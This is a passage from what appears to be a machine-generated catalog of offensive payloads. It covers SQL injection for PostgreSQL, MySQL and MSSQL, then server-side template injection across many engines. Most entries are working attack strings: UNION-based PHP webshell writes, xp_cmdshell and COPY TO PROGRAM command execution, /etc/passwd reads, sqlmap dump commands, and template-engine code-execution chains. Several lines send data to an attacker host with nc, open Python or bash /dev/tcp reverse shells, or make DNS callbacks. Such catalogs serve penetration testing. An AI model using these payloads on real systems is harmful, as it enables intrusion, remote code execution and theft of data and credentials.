' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

#### postgresql_error_based
[SQL Injection] | Name         | Payload         | | ------------ | --------------- | | CAST | `AND 1337=CAST('~'\|\|...
**Categories:** sql_injection
```
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

#### postgresql_file_read
[SQL Injection] NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Ne...
**Categories:** sql_injection
```
select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
```

#### postgresql_file_write
[SQL Injection] Using `COPY
**Categories:** sql_injection
```
CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
```

#### postgresql_list_privileges
[SQL Injection] Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg...
**Categories:** sql_injection
```
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

#### postgresql_out_of_band
Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or net...
**Categories:** sql_injection
```
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

#### postgresql_stacked_query
[SQL Injection] Use a semi-colon "`;`" to add another query
**Categories:** sql_injection
```
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

#### postgresql_superuser_role
[SQL Injection] PostgreSQL Superuser Role
**Categories:** sql_injection
```
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

#### postgresql_xml_helpers
[SQL Injection] PostgreSQL XML Helpers
**Categories:** sql_injection
```
SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

#### postprocessing_script_postprocesspy
[SQL Injection] The postprocessing script is used to modify the response data after it is received from the target ap...
**Categories:** sql_injection
```
--postprocess=postprocess.py  Use given script(s) for postprocessing (response)
```

#### preprocess_and_postprocess_scripts
[SQL Injection] Preprocess And Postprocess Scripts
**Categories:** sql_injection
```
sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py
```

#### preprocessing_script_preprocesspy
[SQL Injection] The preprocessing script is used to modify the request data before it is sent to the target applicati...
**Categories:** sql_injection
```
--preprocess=preprocess.py    Use given script(s) for preprocessing (request)
```

#### proxy_configuration_for_sqlmap
[SQL Injection] To run SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap suppor...
**Categories:** sql_injection
```
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

#### python_script
[SQL Injection] > Executed by a different user than the one using `xp_cmdshell` to execute commands
**Categories:** sql_injection
```
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

#### reduce_requests_number
The parameter `--test-filter` is helpful when you want to focus on specific types of SQL injection techniques or payl...
**Categories:** sql_injection
```
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

#### second_order_injection
A second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately...
**Categories:** sql_injection
```
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

#### sqlmap_without_sql_injection
Using SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, pa...
**Categories:** sql_injection
```
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```

#### suffix_and_prefix
[SQL Injection] The `--suffix` and `--prefix` options allow you to specify additional strings that should be appended...
**Categories:** sql_injection
```
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

#### table_dump_time_based
[SQL Injection] Table Dump Time Based
**Categories:** sql_injection
```
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

#### unc_path_ntlm_hash_stealing
[SQL Injection] The term "UNC path" refers to the Universal Naming Convention path used to specify the location of re...
**Categories:** sql_injection
```
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

#### using_conditional_statements
[SQL Injection] Using Conditional Statements
**Categories:** sql_injection
```
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

#### using_copy_to_from_program
[SQL Injection] Installations running Postgres 9.3 and above have functionality which allows for the superuser and us...
**Categories:** sql_injection
```
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
```

#### using_libcso6
[SQL Injection] Using libc.so.6
**Categories:** sql_injection
```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

#### using_sleep_in_a_subselect
[SQL Injection] Extracting the length of the data.
**Categories:** sql_injection
```
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

#### webshell_dumpfile_method
[SQL Injection] WEBSHELL - DUMPFILE Method
**Categories:** sql_injection
```
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

#### webshell_outfile_method
[SQL Injection] WEBSHELL - OUTFILE Method
**Categories:** sql_injection
```
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

#### wide_byte_injection_gbk
Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character s...
**Categories:** sql_injection
```
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

#### xp_cmdshell
[SQL Injection] xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating sy...
**Categories:** sql_injection
```
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

### ssti

#### aspnet_razor_command_execution
[Server Side Template Injection] ASP.NET Razor - Command Execution
**Categories:** ssti, remote_code_execution
```
@{
  // C# code
}
```

#### blade
[Server Side Template Injection] > Universal payloads also work for Blade. Official website > Blade is the simple, ye...
**Categories:** ssti, remote_code_execution
```
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

#### django_admin_site_url_leak
[Server Side Template Injection] Django - Admin Site URL leak
**Categories:** ssti, remote_code_execution
```
{% include 'admin/base.html' %}
```

#### django_admin_username_and_password_hash_leak
[Server Side Template Injection] Django - Admin Username And Password Hash Leak
**Categories:** ssti, remote_code_execution
```
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

#### django_basic_injection
[Server Side Template Injection] Django - Basic Injection
**Categories:** ssti, remote_code_execution
```
{% csrf_token %} # Causes error with Jinja2
{{ 7*7 }}  # Error with Django Templates
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
```

#### django_cross_site_scripting
[Server Side Template Injection] Django - Cross-Site Scripting
**Categories:** ssti, remote_code_execution
```
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

#### django_debug_information_leak
[Server Side Template Injection] Django - Debug Information Leak
**Categories:** ssti, remote_code_execution
```
{% debug %}
```

#### django_leaking_apps_secret_key
[Server Side Template Injection] Django - Leaking App's Secret Key
**Categories:** ssti, remote_code_execution
```
{{ messages.storages.0.signer.key }}
```

#### eex_basic_injections
[Server Side Template Injection] EEx - Basic injections
**Categories:** ssti, remote_code_execution
```
<%= 7 * 7 %>
```

#### eex_remote_command_execution
[Server Side Template Injection] EEx - Remote Command execution
**Categories:** ssti, remote_code_execution
```
<%= elem(System.shell("id"), 0) %> # Rendered RCE
<%= [1, 2][elem(System.shell("id"), 0)] %> # Error-Based RCE
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %> # Boolean-Based RCE
<%= elem(System.shell("id && sleep 5"), 0) %> # Time-Based RCE
```

#### eex_retrieve_etc_passwd
[Server Side Template Injection] EEx - Retrieve /etc/passwd
**Categories:** ssti, remote_code_execution
```
<%= File.read!("/etc/passwd") %>
```

#### exploit_the_ssti_by_calling_ospopenread
[Server Side Template Injection] Exploit The SSTI By Calling os.popen().read()
**Categories:** ssti, remote_code_execution
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### exploit_the_ssti_by_calling_popen_without_guessing_the_offset
[Server Side Template Injection] Exploit The SSTI By Calling Popen Without Guessing The Offset
**Categories:** ssti, remote_code_execution
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

#### exploit_the_ssti_by_calling_subprocesspopen
[Server Side Template Injection] :warning: the number 396 will vary depending of the application.
**Categories:** ssti, remote_code_execution
```
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### exploit_the_ssti_by_writing_an_evil_config_file
[Server Side Template Injection] Exploit The SSTI By Writing An Evil Config File
**Categories:** ssti, remote_code_execution
```
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

#### freemarker_code_execution
[Server Side Template Injection] Freemarker - Code Execution
**Categories:** ssti, remote_code_execution
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]

${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
```

#### freemarker_code_execution_with_obfuscation
[Server Side Template Injection] FreeMarker offers the built-in function: `lower_abc`. This function converts int-bas...
**Categories:** ssti, remote_code_execution
```
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

#### freemarker_read_file
[Server Side Template Injection] Freemarker - Read File
**Categories:** ssti, remote_code_execution
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

#### freemarker_sandbox_bypass
[Server Side Template Injection] :warning: only works on Freemarker versions below 2.3.30
**Categories:** ssti, remote_code_execution
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

#### groovy_command_execution
[Server Side Template Injection] Groovy - Command Execution
**Categories:** ssti, remote_code_execution
```
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

#### groovy_command_execution_with_obfuscation
[Server Side Template Injection] You can bypass security filters by constructing strings from ASCII codes and executi...
**Categories:** ssti, remote_code_execution
```
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
```

#### groovy_http_request
[Server Side Template Injection] Groovy - HTTP Request
**Categories:** ssti, remote_code_execution
```
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

#### groovy_read_file
[Server Side Template Injection] Groovy - Read File
**Categories:** ssti, remote_code_execution
```
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

#### groovy_sandbox_bypass
[Server Side Template Injection] Groovy - Sandbox Bypass
**Categories:** ssti, remote_code_execution
```
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

#### handlebars_basic_injection
[Server Side Template Injection] Handlebars - Basic Injection
**Categories:** ssti, remote_code_execution
```
{{this}}
{{self}}
```

#### handlebars_command_execution
[Server Side Template Injection] This payload only work in handlebars versions, fixed in GHSA-q42p-pg8m-cqh6: >= 4.1....
**Categories:** ssti, remote_code_execution
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### inject_template_syntax
[Server Side Template Injection] The attacker tests the identified input field by injecting template syntax specific...
**Categories:** ssti, remote_code_execution
```
${{<%[%'"}}%\.
```

#### java_el_basic_injection
[Server Side Template Injection] Java has multiple Expression Languages using similar syntax. > Multiple variable exp...
**Categories:** ssti, remote_code_execution
```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

#### java_el_code_execution
[Server Side Template Injection] Java EL - Code Execution
**Categories:** ssti, remote_code_execution
```
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE
```

#### jinja2_basic_injection
[Server Side Template Injection] Jinja2 - Basic Injection
**Categories:** ssti, remote_code_execution
```
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

#### jinja2_debug_statement
[Server Side Template Injection] If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the...
**Categories:** ssti, remote_code_execution
```
<pre>{% debug %}</pre>
```

#### jinja2_dump_all_config_variables
[Server Side Template Injection] Jinja2 - Dump All Config Variables
**Categories:** ssti, remote_code_execution
```
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

#### jinja2_dump_all_used_classes
[Server Side Template Injection] Jinja2 - Dump All Used Classes
**Categories:** ssti, remote_code_execution
```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

#### jinja2_filter_bypass
[Server Side Template Injection] Jinja2 - Filter Bypass
**Categories:** ssti, remote_code_execution
```
request.__class__
request["__class__"]
```

#### jinja2_forcing_output_on_blind_rce
[Server Side Template Injection] You can import Flask functions to return an output from the vulnerable page.
**Categories:** ssti, remote_code_execution
```
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

#### jinja2_read_remote_file
[Server Side Template Injection] Jinja2 - Read Remote File
**Categories:** ssti, remote_code_execution
```
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

#### jinja2_remote_command_execution
[Server Side Template Injection] Listen for connection
**Categories:** ssti, remote_code_execution
```
nc -lnvp 8000
```

#### jinja2_remote_command_execution_with_obfuscation
[Server Side Template Injection] Write the string: `id` using the index position of a known existing string (the inde...
**Categories:** ssti, remote_code_execution
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```

#### jinja2_template_format
[Server Side Template Injection] Jinja2 - Template Format
**Categories:** ssti, remote_code_execution
```
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```

#### jinja2_write_into_remote_file
[Server Side Template Injection] Jinja2 - Write Into Remote File
**Categories:** ssti, remote_code_execution
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

#### jinjava_basic_injection
[Server Side Template Injection] Jinjava - Basic Injection
**Categories:** ssti, remote_code_execution
```
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

#### jinjava_command_execution
[Server Side Template Injection] Fixed by HubSpot/jinjava PR #230
**Categories:** ssti, remote_code_execution
```
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

#### latte_basic_injection
[Server Side Template Injection] Latte - Basic Injection
**Categories:** ssti, remote_code_execution
```
{var $X="POC"}{$X}
```

#### latte_code_execution
[Server Side Template Injection] Latte - Code Execution
**Categories:** ssti, remote_code_execution
```
{php system('nslookup oastify.com')}
```

#### lodash_basic_injection
[Server Side Template Injection] How to create a template:
**Categories:** ssti, remote_code_execution
```
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

#### lodash_command_execution
[Server Side Template Injection] Lodash - Command Execution
**Categories:** ssti, remote_code_execution
```
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

#### mako_remote_command_execution
[Server Side Template Injection] Any of these payloads allows direct access to the `os` module
**Categories:** ssti, remote_code_execution
```
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

#### mako_remote_command_execution_with_obfuscation
[Server Side Template Injection] In Mako, the following payload can be used to generates the string "id": `${str().jo...
**Categories:** ssti, remote_code_execution
```
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

#### ognl_basic_injection
[Server Side Template Injection] > OGNL can be used with different tags like `${ }
**Categories:** ssti, remote_code_execution
```
7*7
'patt'.toString().replace('a', 'x')
@java.lang.Integer@valueOf('1')
```

#### ognl_command_execution
[Server Side Template Injection] Rendered:
**Categories:** ssti, remote_code_execution
```
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

#### pattemplate
[Server Side Template Injection] > patTemplate non-compiling PHP templating engine, that uses XML tags to divide a do...
**Categories:** ssti, remote_code_execution
```
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

#### pebble_basic_injection
[Server Side Template Injection] Pebble - Basic Injection
**Categories:** ssti, remote_code_execution
```
{{ someString.toUPPERCASE() }}
```

#### pebble_code_execution
[Server Side Template Injection] Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang...
**Categories:** ssti, remote_code_execution
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

#### phplib_and_html_template_phplib
[Server Side Template Injection] HTML_Template_PHPLIB is the same as PHPlib but ported to Pear. authors.tpl
**Categories:** ssti, remote_code_execution
```
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

#### plates
[Server Side Template Injection] Plates is inspired by Twig but a native PHP template engine instead of a compiled te...
**Categories:** ssti, remote_code_execution
```
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```

#### ruby_basic_injections
[Server Side Template Injection] ERB**:
**Categories:** ssti, remote_code_execution
```
<%= 7 * 7 %>
```

#### ruby_list_files_and_directories
[Server Side Template Injection] Ruby - List files and directories
**Categories:** ssti, remote_code_execution
```
<%= Dir.entries('/') %>
```

#### ruby_remote_command_execution
[Server Side Template Injection] Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.
**Categories:** ssti, remote_code_execution
```
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

#### ruby_retrieve_etc_passwd
[Server Side Template Injection] Ruby - Retrieve /etc/passwd
**Categories:** ssti, remote_code_execution
```
<%= File.open('/etc/passwd').read %>
```

#### server_side_template_injection_mako
[Server Side Template Injection] > Universal payloads also work for Mako. Official website > Mako is a template libra...
**Categories:** ssti, remote_code_execution
```
<%
import os
x=os.popen('id').read()
%>
${x}
```

#### server_side_template_injection_pug
